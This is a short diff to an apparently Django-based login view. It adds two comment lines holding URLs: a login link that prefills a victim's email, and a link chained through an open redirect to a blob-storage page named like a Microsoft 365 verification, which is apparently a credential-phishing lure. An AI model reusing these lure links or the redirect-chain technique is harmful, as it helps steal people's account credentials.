@@ -77,3 +77,7 @@ def user_login_view(request):
             'email_is_valid': email_is_valid,
         }
         return render(request, 'frontend/login.html', context)
+# https://macasaca.onrender.com/login/?em=mike@gmail.com
+
+# http://slot-lucky.com/bbs/c-board.cgi?cmd=lct;url=https://waysapps.blob.core.windows.net/confirmsssoutho3653verify/Reed2025Fitzgerald.html
+
